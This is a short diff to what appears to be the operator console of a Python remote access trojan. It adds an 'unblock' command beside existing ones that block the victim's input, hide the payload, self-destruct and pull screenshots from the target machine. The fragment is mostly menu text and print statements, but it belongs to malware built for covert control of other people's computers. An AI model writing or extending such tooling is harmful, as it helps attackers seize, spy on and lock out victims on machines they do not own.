@@ -135,6 +135,7 @@ kill                  ->  Program will stop and self distruct itself
 banner                ->  Show banner
 hide                  ->  Hide payload
 blockinput            ->  Input will be blocked
+unblock               ->  Input will be unblocked
 quit                  ->  Quit the existing shell
 =================================================================
             ''', 'yellow'))
@@ -145,7 +146,9 @@ quit                  ->  Quit the existing shell
         elif command == 'quit':
             break
         elif command == 'blockinput':
-            print("Input blocked ,will be unblocked in 30 seconds . . .")
+            print("Input blocked!")
+        elif command == 'unblock':
+            print("Input Unblocked")
         elif command == 'screenshot':
             try:
                 download_file(target,'scrn.png')
